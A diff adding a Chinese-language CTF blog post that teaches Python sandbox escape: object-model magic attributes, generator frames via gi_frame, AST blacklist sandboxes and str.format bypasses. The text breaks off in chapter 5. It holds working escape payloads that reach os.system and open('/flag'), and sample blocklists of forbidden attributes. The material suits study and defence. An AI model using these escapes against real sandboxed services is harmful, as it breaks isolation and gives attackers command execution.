@@ -1,0 +1,396 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>My Blog · Python 沙箱逃逸全解：从入门到实战</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Ma+Shan+Zheng&family=Noto+Serif+SC:wght@400;700;900&display=swap" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+  <!-- 星空 -->
+  <canvas id="stars-canvas"></canvas>
+
+  <!-- 薄雾 -->
+  <div class="mist-layer">
+    <div class="mist"></div><div class="mist"></div><div class="mist"></div>
+  </div>
+
+  <!-- 花瓣 -->
+  <div class="petal-container" id="petalContainer"></div>
+
+  <!-- 导航 -->
+  <nav id="navbar">
+    <div class="nav-container">
+      <a href="/" class="logo">My Blog</a>
+      <div class="nav-links">
+        <a href="/">首页</a>
+        <a href="/archives">文章</a>
+        <a href="/about">关于</a>
+      </div>
+    </div>
+  </nav>
+
+  <!-- 内容 -->
+  <main class="content-layer">
+    <section class="section-container" style="padding-top: 140px;">
+  <article class="post-card">
+    <h1 class="post-title">Python 沙箱逃逸全解：从入门到实战</h1>
+    <div class="post-meta">
+      <span>2026-06-23</span>
+      
+        <span style="margin-left: 16px;color:rgba(201,169,110,0.6);">CTF · Python · 沙箱逃逸 · SCTF · 代码审计</span>
+      
+    </div>
+    <div class="post-content">
+      <blockquote>
+<p>涵盖 SCTF Rule Lab 等多种经典题型，系统化拆解 Python 沙箱逃逸的底层原理与绕过手法</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E7%AC%AC1%E7%AB%A0-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%A6%82%E8%BF%B0">第1章 Python 沙箱逃逸概述</a></li>
+<li><a href="#%E7%AC%AC2%E7%AB%A0-python-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E5%9F%BA%E7%A1%80">第2章 Python 对象模型基础</a></li>
+<li><a href="#%E7%AC%AC3%E7%AB%A0-%E7%94%9F%E6%88%90%E5%99%A8%E4%B8%8E%E6%A0%88%E5%B8%A7">第3章 生成器与栈帧</a></li>
+<li><a href="#%E7%AC%AC4%E7%AB%A0-ast-%E9%BB%91%E5%90%8D%E5%8D%95%E6%B2%99%E7%AE%B1">第4章 AST 黑名单沙箱</a></li>
+<li><a href="#%E7%AC%AC5%E7%AB%A0-strformat-%E9%80%83%E9%80%B8">第5章 str.format() 逃逸</a></li>
+<li><a href="#%E7%AC%AC6%E7%AB%A0-%E5%85%B6%E4%BB%96%E9%80%83%E9%80%B8%E6%89%8B%E6%B3%95">第6章 其他逃逸手法</a></li>
+<li><a href="#%E7%AC%AC7%E7%AB%A0-%E5%AE%9E%E6%88%98sctf-rule-lab">第7章 实战：SCTF Rule Lab</a></li>
+<li><a href="#%E7%AC%AC8%E7%AB%A0-%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D">第8章 防御与修复</a></li>
+</ul>
+<h2 id="第1章-Python-沙箱逃逸概述"><a href="#第1章-Python-沙箱逃逸概述" class="headerlink" title="第1章 Python 沙箱逃逸概述"></a>第1章 Python 沙箱逃逸概述</h2><h3 id="1-1-什么是沙箱"><a href="#1-1-什么是沙箱" class="headerlink" title="1.1 什么是沙箱"></a>1.1 什么是沙箱</h3><p>沙箱（Sandbox）是一种安全机制，为不可信的代码提供一个隔离的执行环境。Python 沙箱通常用于：</p>
+<ul>
+<li><strong>在线判题系统</strong>（OJ）：用户提交代码在服务端执行</li>
+<li><strong>CTF 题目</strong>：选手需要从受限的代码执行环境中逃逸出来拿 Flag</li>
+<li><strong>插件系统</strong>：第三方插件运行在隔离环境中</li>
+<li><strong>REPL 平台</strong>：在线 Python 解释器</li>
+</ul>
+<h3 id="1-2-沙箱逃逸的本质"><a href="#1-2-沙箱逃逸的本质" class="headerlink" title="1.2 沙箱逃逸的本质"></a>1.2 沙箱逃逸的本质</h3><p>沙箱逃逸（Sandbox Escape）就是<strong>从受限的执行环境突破到不受限的环境中</strong>。在 Python 沙箱中通常意味着：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">受限环境                          不受限环境</span><br><span class="line">──────────────────   逃逸    ──────────────────</span><br><span class="line">只能调某些函数      ────→    可以调任意函数</span><br><span class="line">不能 import        ────→    可以 import os</span><br><span class="line">不能读文件         ────→    可以 open(&quot;/flag&quot;)</span><br><span class="line">不能执行命令       ────→    可以 os.system(&quot;id&quot;)</span><br></pre></td></tr></table></figure>
+
+<h3 id="1-3-沙箱的三种类型"><a href="#1-3-沙箱的三种类型" class="headerlink" title="1.3 沙箱的三种类型"></a>1.3 沙箱的三种类型</h3><table>
+<thead>
+<tr>
+<th>类型</th>
+<th>原理</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>受限命名空间</strong></td>
+<td>只提供白名单函数&#x2F;模块</td>
+<td><code>exec(code, {&quot;__builtins__&quot;: {}})</code></td>
+</tr>
+<tr>
+<td><strong>AST 黑名单</strong></td>
+<td>编译前扫描语法树，拦截危险节点</td>
+<td>遍历 AST 检查属性名</td>
+</tr>
+<tr>
+<td><strong>白名单字节码</strong></td>
+<td>只允许特定字节码指令</td>
+<td>RestrictedPython</td>
+</tr>
+</tbody></table>
+<p>本文重点讲解 <strong>AST 黑名单型</strong> 沙箱及其绕过。</p>
+<hr>
+<h2 id="第2章-Python-对象模型基础"><a href="#第2章-Python-对象模型基础" class="headerlink" title="第2章 Python 对象模型基础"></a>第2章 Python 对象模型基础</h2><h3 id="2-1-Python-一切皆对象"><a href="#2-1-Python-一切皆对象" class="headerlink" title="2.1 Python 一切皆对象"></a>2.1 Python 一切皆对象</h3><p>这是理解 Python 沙箱逃逸的<strong>第一性原理</strong>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 类是对象</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span>: <span class="keyword">pass</span>      <span class="comment"># Foo 本身也是对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 函数是对象</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bar</span>(): <span class="keyword">pass</span>      <span class="comment"># bar 本身也是对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 类型是对象</span></span><br><span class="line"><span class="built_in">type</span>(<span class="number">42</span>)             <span class="comment"># int 也是对象</span></span><br><span class="line"><span class="built_in">type</span>(<span class="built_in">int</span>)            <span class="comment"># type 本身也是对象</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-属性的递归访问链"><a href="#2-2-属性的递归访问链" class="headerlink" title="2.2 属性的递归访问链"></a>2.2 属性的递归访问链</h3><p>Python 的对象通过 <code>.</code> 运算符和 <code>[]</code> 下标运算符递归访问，这种递归性决定了逃逸路径的深度：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">obj.attr           <span class="comment"># 对象属性</span></span><br><span class="line">obj[<span class="string">&quot;key&quot;</span>]         <span class="comment"># 下标访问</span></span><br><span class="line">obj.attr[<span class="string">&quot;key&quot;</span>]    <span class="comment"># 链式组合</span></span><br><span class="line">obj.a.b.c.d       <span class="comment"># 任意深度</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-魔术属性链：沙箱逃逸的”高速公路”"><a href="#2-3-魔术属性链：沙箱逃逸的”高速公路”" class="headerlink" title="2.3 魔术属性链：沙箱逃逸的”高速公路”"></a>2.3 魔术属性链：沙箱逃逸的”高速公路”</h3><p>每个 Python 对象都有一系列以 <code>__</code> 开头的魔术属性，它们是沙箱逃逸的”高速公路”：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__                 <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__         <span class="comment"># 方法解析顺序 (Method Resolution Order)</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>]      <span class="comment"># &lt;class &#x27;object&#x27;&gt; — 所有类的基类</span></span><br><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()  <span class="comment"># object 的所有子类</span></span><br></pre></td></tr></table></figure>
+
+<p>这条链被称为 <strong>Python 沙箱逃逸的”万能钥匙”</strong>：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 经典逃逸链</span></span><br><span class="line"><span class="keyword">for</span> cls <span class="keyword">in</span> <span class="string">&quot;&quot;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> cls.__name__ == <span class="string">&quot;BuiltinImporter&quot;</span>:</span><br><span class="line">        cls.load_module(<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;id&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-4-builtins-：内置函数的宝库"><a href="#2-4-builtins-：内置函数的宝库" class="headerlink" title="2.4 __builtins__：内置函数的宝库"></a>2.4 <code>__builtins__</code>：内置函数的宝库</h3><p><code>__builtins__</code> 包含了所有 Python 内置函数：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">__builtins__[<span class="string">&quot;__import__&quot;</span>]   <span class="comment"># import 语句的底层函数</span></span><br><span class="line">__builtins__[<span class="string">&quot;open&quot;</span>]         <span class="comment"># 文件打开函数</span></span><br><span class="line">__builtins__[<span class="string">&quot;eval&quot;</span>]         <span class="comment"># 表达式求值</span></span><br><span class="line">__builtins__[<span class="string">&quot;exec&quot;</span>]         <span class="comment"># 代码执行</span></span><br><span class="line">__builtins__[<span class="string">&quot;__import__&quot;</span>](<span class="string">&quot;os&quot;</span>).system(<span class="string">&quot;id&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>几乎所有沙箱逃逸的最终目标都是<strong>拿到 <code>__builtins__</code></strong>。</p>
+<hr>
+<h2 id="第3章-生成器与栈帧"><a href="#第3章-生成器与栈帧" class="headerlink" title="第3章 生成器与栈帧"></a>第3章 生成器与栈帧</h2><h3 id="3-1-生成器基础"><a href="#3-1-生成器基础" class="headerlink" title="3.1 生成器基础"></a>3.1 生成器基础</h3><p><strong>普通函数</strong>：调用后一口气执行完，返回，内部变量全部销毁。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    secret = <span class="string">&quot;flag&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(secret)</span><br></pre></td></tr></table></figure>
+
+<p><strong>生成器函数</strong>：带 <code>yield</code> 关键字，调用后返回生成器对象，每次执行到 <code>yield</code> 暂停。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    secret = <span class="string">&quot;flag&quot;</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span>   <span class="comment"># ← 暂停键</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">g = hello()   <span class="comment"># 只是创建对象，不执行函数体</span></span><br><span class="line"><span class="built_in">next</span>(g)       <span class="comment"># 执行到第一个 yield，暂停</span></span><br><span class="line"><span class="built_in">next</span>(g)       <span class="comment"># 继续执行到第二个 yield，暂停</span></span><br><span class="line"><span class="built_in">next</span>(g)       <span class="comment"># StopIteration</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-yield-的暂停机制"><a href="#3-2-yield-的暂停机制" class="headerlink" title="3.2 yield 的暂停机制"></a>3.2 yield 的暂停机制</h3><p><strong>关键理解</strong>：<code>yield</code> 暂停时，函数没有结束，所有局部变量仍然存在于内存中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    secret = <span class="string">&quot;只有我内部知道&quot;</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">g = gen()</span><br><span class="line"><span class="built_in">next</span>(g)   <span class="comment"># 执行到 yield，暂停</span></span><br><span class="line"><span class="comment"># secret 变量仍然存活在内存中，等待可能的 next(g) 继续执行</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-3-Frame（栈帧）"><a href="#3-3-Frame（栈帧）" class="headerlink" title="3.3 Frame（栈帧）"></a>3.3 Frame（栈帧）</h3><p>每次 Python 调用一个函数，底层会创建一个 <strong>frame 对象</strong>（栈帧），记录函数执行时的所有状态。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────────────────────────┐</span><br><span class="line">│               Frame                   │</span><br><span class="line">│                                       │</span><br><span class="line">│  f_locals → 局部变量字典              │</span><br><span class="line">│  f_globals → 全局变量字典             │</span><br><span class="line">│  f_code       → 代码对象（字节码）    │</span><br><span class="line">│  f_lineno     → 当前执行行号          │</span><br><span class="line">│  f_back       → 上一层调用者的帧      │</span><br><span class="line">└──────────────────────────────────────┘</span><br></pre></td></tr></table></figure>
+
+<p>普通函数返回后 frame 销毁。<strong>生成器的 frame 在 yield 后不会销毁</strong>。</p>
+<h3 id="3-4-gi-frame-—-生成器的栈帧接口"><a href="#3-4-gi-frame-—-生成器的栈帧接口" class="headerlink" title="3.4 gi_frame — 生成器的栈帧接口"></a>3.4 <code>gi_frame</code> — 生成器的栈帧接口</h3><p><code>gi</code> &#x3D; <strong>G</strong>enerator <strong>I</strong>terator。每个生成器对象通过 <code>gi_frame</code> 暴露其内部栈帧：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>():</span><br><span class="line">    secret = <span class="string">&quot;CTF&#123;flag&#125;&quot;</span></span><br><span class="line">    <span class="keyword">yield</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">g = gen()</span><br><span class="line">g.gi_frame       <span class="comment"># None — 生成器还没启动</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">next</span>(g)          <span class="comment"># 启动生成器，执行到 yield</span></span><br><span class="line">g.gi_frame       <span class="comment"># &lt;frame object at 0x...&gt; — 有值了！</span></span><br><span class="line">g.gi_frame.f_locals</span><br><span class="line"><span class="comment"># &#123;&#x27;secret&#x27;: &#x27;CTF&#123;flag&#125;&#x27;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-5-从生成器到-frame-属性速查"><a href="#3-5-从生成器到-frame-属性速查" class="headerlink" title="3.5 从生成器到 frame 属性速查"></a>3.5 从生成器到 frame 属性速查</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">g.gi_frame                  <span class="comment"># frame 对象</span></span><br><span class="line">g.gi_frame.f_locals         <span class="comment"># 局部变量字典     ← 读生成器内部变量</span></span><br><span class="line">g.gi_frame.f_globals        <span class="comment"># 全局变量字典     ← 含 __builtins__</span></span><br><span class="line">g.gi_frame.f_back           <span class="comment"># 调用者帧        ← 向上回溯</span></span><br><span class="line">g.gi_frame.f_code           <span class="comment"># 代码对象</span></span><br><span class="line">g.gi_frame.f_lineno         <span class="comment"># 当前行号</span></span><br><span class="line">g.gi_frame.f_locals[<span class="string">&quot;shipment_manifest&quot;</span>]  <span class="comment"># ← 读取指定局部变量</span></span><br><span class="line">g.gi_frame.f_globals[<span class="string">&quot;__builtins__&quot;</span>][<span class="string">&quot;open&quot;</span>](<span class="string">&quot;/flag&quot;</span>).read()  <span class="comment"># ← RCE</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="3-6-为什么-gi-frame-会存在？"><a href="#3-6-为什么-gi-frame-会存在？" class="headerlink" title="3.6 为什么 gi_frame 会存在？"></a>3.6 为什么 gi_frame 会存在？</h3><p><code>gi_frame</code> 的本意是供调试器（pdb、traceback）使用的。但在沙箱中，它成了攻击者从外部窥探函数内部的窗口。</p>
+<hr>
+<h2 id="第4章-AST-黑名单沙箱"><a href="#第4章-AST-黑名单沙箱" class="headerlink" title="第4章 AST 黑名单沙箱"></a>第4章 AST 黑名单沙箱</h2><h3 id="4-1-什么是-AST"><a href="#4-1-什么是-AST" class="headerlink" title="4.1 什么是 AST"></a>4.1 什么是 AST</h3><p>AST（Abstract Syntax Tree，抽象语法树）是源代码的树形结构表示。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line">code = <span class="string">&quot;a + b * 3&quot;</span></span><br><span class="line">tree = ast.parse(code)</span><br></pre></td></tr></table></figure>
+
+<p>解析后的树：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Module</span><br><span class="line">  └── Expr</span><br><span class="line">      └── BinOp</span><br><span class="line">          ├── Name(&#x27;a&#x27;)</span><br><span class="line">          ├── Add()</span><br><span class="line">          └── BinOp</span><br><span class="line">              ├── Name(&#x27;b&#x27;)</span><br><span class="line">              ├── Mult()</span><br><span class="line">              └── Constant(3)</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-2-AST-黑名单沙箱的工作原理"><a href="#4-2-AST-黑名单沙箱的工作原理" class="headerlink" title="4.2 AST 黑名单沙箱的工作原理"></a>4.2 AST 黑名单沙箱的工作原理</h3><p>三步流程：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户输入代码字符串</span><br><span class="line">     │</span><br><span class="line">     ▼</span><br><span class="line">Step 1: ast.parse(code)    → 把源码解析成 AST</span><br><span class="line">Step 2: 遍历 AST 节点       → 检查黑名单中的属性名/字符串</span><br><span class="line">Step 3: 通过后 exec(code)   → 执行</span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-两种拦截方式"><a href="#4-3-两种拦截方式" class="headerlink" title="4.3 两种拦截方式"></a>4.3 两种拦截方式</h3><h4 id="方式一：拦截属性名（ast-Attribute）"><a href="#方式一：拦截属性名（ast-Attribute）" class="headerlink" title="方式一：拦截属性名（ast.Attribute）"></a>方式一：拦截属性名（ast.Attribute）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN_ATTRS = &#123;</span><br><span class="line">    <span class="string">&quot;gi_frame&quot;</span>, <span class="string">&quot;f_locals&quot;</span>, <span class="string">&quot;f_globals&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__base__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__builtins__&quot;</span>, <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__code__&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(tree):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Attribute):</span><br><span class="line">        <span class="keyword">if</span> node.attr <span class="keyword">in</span> FORBIDDEN_ATTRS:</span><br><span class="line">            <span class="keyword">raise</span> SandboxError(<span class="string">f&quot;forbidden attribute: <span class="subst">&#123;node.attr&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>拦截示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">g.gi_frame                    <span class="comment"># ❌ ast.Attribute(attr=&quot;gi_frame&quot;)</span></span><br><span class="line">g.gi_frame.f_locals           <span class="comment"># ❌ 两次拦截</span></span><br><span class="line">().__class__                  <span class="comment"># ❌ ast.Attribute(attr=&quot;__class__&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="方式二：拦截字符串常量（ast-Constant）"><a href="#方式二：拦截字符串常量（ast-Constant）" class="headerlink" title="方式二：拦截字符串常量（ast.Constant）"></a>方式二：拦截字符串常量（ast.Constant）</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FORBIDDEN_STRINGS = &#123;</span><br><span class="line">    <span class="string">&quot;gi_frame&quot;</span>, <span class="string">&quot;f_locals&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> node <span class="keyword">in</span> ast.walk(tree):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(node, ast.Constant) <span class="keyword">and</span> <span class="built_in">isinstance</span>(node.value, <span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">for</span> s <span class="keyword">in</span> FORBIDDEN_STRINGS:</span><br><span class="line">            <span class="keyword">if</span> s <span class="keyword">in</span> node.value:</span><br><span class="line">                <span class="keyword">raise</span> SandboxError(<span class="string">f&quot;forbidden string: <span class="subst">&#123;s&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>拦截示例：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;gi_frame&quot;</span>                <span class="comment"># ❌ ast.Constant(&quot;gi_frame&quot;)</span></span><br><span class="line">x = <span class="string">&quot;f_locals&quot;</span>                <span class="comment"># ❌ ast.Constant(&quot;f_locals&quot;)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-4-AST-检查的致命盲区"><a href="#4-4-AST-检查的致命盲区" class="headerlink" title="4.4 AST 检查的致命盲区"></a>4.4 AST 检查的致命盲区</h3><p><strong>AST 只看源码文本，不看运行时的值。</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ❌ 源码中出现 &quot;gi_frame&quot; → AST 检测到 → 拦截</span></span><br><span class="line">x = <span class="string">&quot;gi_frame&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ✅ 源码中出现 &quot;gi_&quot; + &quot;frame&quot; → AST 看到两个单独字符串 → 放行</span></span><br><span class="line">x = <span class="string">&quot;gi_&quot;</span> + <span class="string">&quot;frame&quot;</span></span><br><span class="line"><span class="comment"># 运行时拼接后等于 &quot;gi_frame&quot;，此时 AST 已经检查完毕</span></span><br></pre></td></tr></table></figure>
+
+<p>这是所有绕过手法的<strong>总纲</strong>：编译期和运行期之间的时间差。</p>
+<hr>
+<h2 id="第5章-str-format-逃逸"><a href="#第5章-str-format-逃逸" class="headerlink" title="第5章 str.format() 逃逸"></a>第5章 str.format() 逃逸</h2><h3 id="5-1-format-你以为的功能"><a href="#5-1-format-你以为的功能" class="headerlink" title="5.1 format() 你以为的功能"></a>5.1 format() 你以为的功能</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;我的名字是&#123;&#125;，年龄&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;张三&quot;</span>, <span class="number">18</span>)</span><br><span class="line"><span class="comment"># &#x27;我的名字是张三，年龄18&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&#123;0&#125;和&#123;1&#125;和&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;A&quot;</span>, <span class="string">&quot;B&quot;</span>)</span><br><span class="line"><span class="comment"># &#x27;A和B和A&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-format-实际上能做的"><a href="#5-2-format-实际上能做的" class="headerlink" title="5.2 format() 实际上能做的"></a>5.2 format() 实际上能做的</h3><p><code>str.format()</code> 的格式规范支持属性访问和下标访问：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 属性访问</span></span><br><span class="line"><span class="string">&quot;&#123;0.attr&#125;&quot;</span>.<span class="built_in">format</span>(obj)         → <span class="built_in">getattr</span>(obj, <span class="string">&quot;attr&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下标访问</span></span><br><span class="line"><span class="string">&quot;&#123;0[key]&#125;&quot;</span>.<span class="built_in">format</span>(obj)         → obj[<span class="string">&quot;key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 链式组合（任意深度）</span></span><br><span class="line"><span class="string">&quot;&#123;0.a.b[c].d[e]&#125;&quot;</span>.<span class="built_in">format</span>(obj)  → obj.a.b[<span class="string">&quot;c&quot;</span>].d[<span class="string">&quot;e&quot;</span>]</span><br></pre></td></tr></table></figure>
+
+<p>格式字段解析规则：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;0.a.b[c].d[e]&#125;&quot;.format(obj)</span><br><span class="line"></span><br><span class="line">format() 内部解析:</span><br><span class="line">1. 取第 0 个参数       → obj</span><br><span class="line">2. 遇到 .a             → getattr(obj, &quot;a&quot;)</span><br><span class="line">3. 遇到 .b             → getattr(obj.a, &quot;b&quot;)</span><br><span class="line">4. 遇到 [c]            → obj.a.b[&quot;c&quot;]</span><br><span class="line">5. 遇到 .d             → getattr(obj.a.b[&quot;c&quot;], &quot;d&quot;)</span><br><span class="line">6. 遇到 [e]            → obj.a.b[&quot;c&quot;].d[&quot;e&quot;]</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-3-绕过原理"><a href="#5-3-绕过原理" class="headerlink" title="5.3 绕过原理"></a>5.3 绕过原理</h3><p><code>format()</code> 的格式字符串是一个独立的字符串，可以从运行时拼接得到。AST 检查的是<strong>源码中的字符串常量</strong>，不是拼接结果。</p>
